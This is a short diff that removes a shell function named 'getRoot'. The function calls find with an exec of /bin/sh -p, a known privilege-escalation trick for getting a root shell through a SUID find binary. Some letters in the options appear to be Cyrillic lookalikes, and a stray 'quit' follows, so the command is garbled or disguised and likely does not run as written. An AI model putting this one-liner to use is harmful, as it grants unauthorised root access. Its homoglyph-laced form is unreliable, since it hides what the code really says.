@@ -1,3 +1,0 @@
-getRoot () {
-  find . -ехес /bin/sh -р \; quit
-}
